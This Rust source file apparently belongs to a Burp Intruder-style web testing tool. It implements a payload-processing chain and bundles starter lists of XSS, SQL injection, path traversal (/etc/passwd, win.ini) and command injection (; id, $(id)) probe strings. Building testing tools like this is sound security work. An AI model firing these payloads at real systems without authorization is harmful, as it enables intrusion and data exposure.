//! Chained processors applied to each payload before it is substituted into the
//! request template. Mirrors Burp's "Payload Processing" rules.

use anyhow::Result;
use lancer_core::transform::TransformOp;
use regex::Regex;
use serde::{Deserialize, Serialize};

use crate::intruder::PayloadProcessor;

/// Apply an ordered list of processors. Returns `None` if any "skip-if-matches"
/// rule fires (i.e., the payload should be discarded for this request).
pub fn apply_chain(rules: &[PayloadProcessor], input: &str) -> Result<Option<String>> {
    let mut current = input.to_string();
    for rule in rules {
        match rule {
            PayloadProcessor::Prefix(p) => current = format!("{p}{current}"),
            PayloadProcessor::Suffix(s) => current = format!("{current}{s}"),
            PayloadProcessor::UrlEncode => {
                current = String::from_utf8(TransformOp::UrlEncode.apply(current.as_bytes())?)?
            }
            PayloadProcessor::Base64Encode => {
                current = String::from_utf8(TransformOp::Base64Encode.apply(current.as_bytes())?)?
            }
            PayloadProcessor::ToUpper => current = current.to_ascii_uppercase(),
            PayloadProcessor::ToLower => current = current.to_ascii_lowercase(),
            PayloadProcessor::Hash(kind) => {
                let op = TransformOp::parse(kind).ok_or_else(|| anyhow::anyhow!("unknown hash {kind}"))?;
                current = hex::encode(op.apply(current.as_bytes())?);
            }
            PayloadProcessor::Match { pattern, replacement, regex } => {
                if *regex {
                    let rx = Regex::new(pattern)?;
                    current = rx.replace_all(&current, replacement.as_str()).into_owned();
                } else {
                    current = current.replace(pattern, replacement);
                }
            }
            PayloadProcessor::SkipIfMatches(pat) => {
                let rx = Regex::new(pat)?;
                if rx.is_match(&current) {
                    return Ok(None);
                }
            }
        }
    }
    Ok(Some(current))
}

/// Built-in cheatsheet bundles. Real Burp ships many; we include a starter set.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub enum BuiltinList {
    XssAuto,
    SqliBoolean,
    PathTraversal,
    CommandInjection,
}

impl BuiltinList {
    pub fn payloads(self) -> Vec<&'static str> {
        match self {
            BuiltinList::XssAuto => vec![
                "<script>alert(1)</script>",
                "\"><svg/onload=alert(1)>",
                "javascript:alert(1)",
                "<img src=x onerror=alert(1)>",
                "'><script>alert(1)</script>",
                "<iframe srcdoc=\"<script>alert(1)</script>\">",
            ],
            BuiltinList::SqliBoolean => vec![
                "' OR '1'='1",
                "' OR 1=1--",
                "\" OR \"1\"=\"1",
                "') OR ('1'='1",
                "1 OR 1=1",
                "admin'--",
            ],
            BuiltinList::PathTraversal => vec![
                "../../../etc/passwd",
                "..\\..\\..\\windows\\win.ini",
                "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                "....//....//etc/passwd",
                "/etc/passwd%00",
            ],
            BuiltinList::CommandInjection => vec![
                "; id",
                "| id",
                "`id`",
                "$(id)",
                "& whoami",
                "%0aid",
            ],
        }
    }
}
